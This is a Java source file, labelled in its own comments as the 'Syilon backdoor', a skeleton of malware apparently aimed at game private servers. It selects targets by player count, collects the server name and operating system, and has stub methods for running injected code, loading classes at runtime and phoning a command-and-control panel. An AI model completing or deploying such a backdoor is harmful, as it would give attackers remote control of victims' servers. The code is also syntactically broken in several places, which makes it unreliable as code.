/*
 * The MIT License
 *
 * Copyright 2014 PFM.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package syilonloader;
//Syilon backdoor by PFM
//    Rspunit 2014
//       Core

public class syilonCore {
    
    
    public boolean isDesignatedTarget() {
	//Relies on PlayerHandler import
        if PlayerHandler.getPlayerCount >= 15 { //Determines if player count is 15 or above, then returns true.
		return true;
		} else {
		//returns false if player count < 15
        return false;
    }
    
    public String getServerName() {
        //Relies on import server.Config;
		return Config.serverName;
    }
    
    public String getServerOS() {
	//Displays the operating system the server is hosted on
        return System.getProperty("os.name"));
    }
    
    public boolean runEvaledCode(String codeToRun) {
        return false;
    }
    
    public boolean injectClassOnRuntime() {
        return false;
    }
    
    public int getPlayersOnline() {
	//Relies on PlayerHandler import
	//Displays how many players are online
        return PlayerHandler.getPlayerCount;
    }
    
    public boolean phoneCnC() {
        //returns true if we can connect to the panel, false if there's an issue
       return false; 
    }
}
